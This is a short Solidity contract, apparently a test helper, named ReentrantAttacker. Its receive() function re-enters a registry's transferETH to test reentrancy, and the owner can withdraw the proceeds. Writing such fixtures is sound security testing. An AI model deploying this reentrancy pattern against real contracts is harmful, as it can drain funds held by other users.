// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IRegistry { // Make sure this matches your Registry's transferETH
    function transferETH(address payable to, uint256 amount) external;
}

contract ReentrantAttacker {
    IRegistry public vulnerableRegistry;
    address payable public owner; // Made payable for withdrawal

    constructor(address _registryAddress) {
        vulnerableRegistry = IRegistry(_registryAddress);
        owner = payable(msg.sender);
    }

    receive() external payable {
        // Only re-enter if registry sent some ETH, and we have a bit to send back for the test.
        // This is a simplified re-entrancy check.
        if (msg.value > 0 && address(this).balance >= 0.01 ether) {
            vulnerableRegistry.transferETH(owner, 0.01 ether); 
        }
    }

    function withdraw() external {
        owner.transfer(address(this).balance);
    }
}